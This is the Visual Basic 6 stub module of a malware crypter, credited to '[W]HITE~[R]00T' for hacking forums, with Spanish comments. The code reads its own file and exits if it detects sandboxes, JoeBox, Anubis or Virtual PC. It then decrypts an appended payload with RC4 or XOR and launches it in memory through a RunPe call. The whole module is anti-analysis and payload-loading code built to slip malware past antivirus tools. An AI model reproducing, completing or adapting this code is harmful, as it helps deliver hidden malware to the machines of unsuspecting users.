Attribute VB_Name = "Module1"
'=====================================================================================
'=====================================================================================
'======================== Crypter Creado por [W]HITE~[R]00T ==========================
'================ Para Indetectables.net & Professional-Hacker.org ===================
'================= Greets to: HaX991, DARK_J4V13R, Xa0s, ~V~, dSR ====================
'Aprende del Código, usalo y no hagas RIP's ni el Lammer. Recuerda siempre dar las gra-
'cias y poner Autor y fuente si no lo has hecho tu!, Visita las webs mencionadas. Salu2
'=====================================================================================
'=====================================================================================

'/////////////////////////////////////////////////////////////////////////////////////
'==================> CON TEMOR A DIOS, Y SIN MIEDO AL HOMBRE! <=======================
'/////////////////////////////////////////////////////////////////////////////////////





'/////////////////////////////////////////////////////////////////////////////////////
Sub Main()
Dim MisDatos As String

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
    MisDatos = Space(LOF(1))
    Get #1, , MisDatos
Close #1

Dim Antis() As String

Antis() = Split(MisDatos, "GraciasDARK_J4V13R")

If Antis(1) = "1" Then

    If Sandboxed() = True Then End
    
End If

If Antis(2) = "1" Then

    If iJoeBoxRunning(Environ("SystemDrive") & "\") = True Then End

End If

If Antis(3) = "1" Then

    If iAnubisRunning(Environ("SystemDrive") & "\") = True Then End

End If

If Antis(4) = "1" Then

    If IsVirtualPCPresent = 2 Then End

End If

'Ya, ahora que se hace en el cliente? uff lo mismo que se hace con el crypter

Dim xSplit() As String

xSplit() = Split(MisDatos, "[W]HITE")

'xSplit(0)= Stub
'xSplit(1)= El Archivo encriptado
'xSplit(2)= La encriptacion que se usa
'xSplit(3)= Key

'////////////////////////////////////////////////////////////////////////////

Dim RC4 As New clsRC4, xXor As New clsXOR

If xSplit(2) = "RC4" Then
    xSplit(1) = RC4.DecryptString(xSplit(1), xSplit(3))
End If

If xSplit(2) = "XOR" Then
    xSplit(1) = xXor.DecryptString(xSplit(1), xSplit(3))
End If

'//////////////////////////////////////////////////////////////////////////////

Dim hDatos() As Byte
    hDatos() = StrConv(xSplit(1), vbFromUnicode)
'//////////////////////////////////////////////////////////////////////////////

Call RunPe(App.Path & "\" & App.EXEName & ".exe", hDatos(), Command)


End Sub
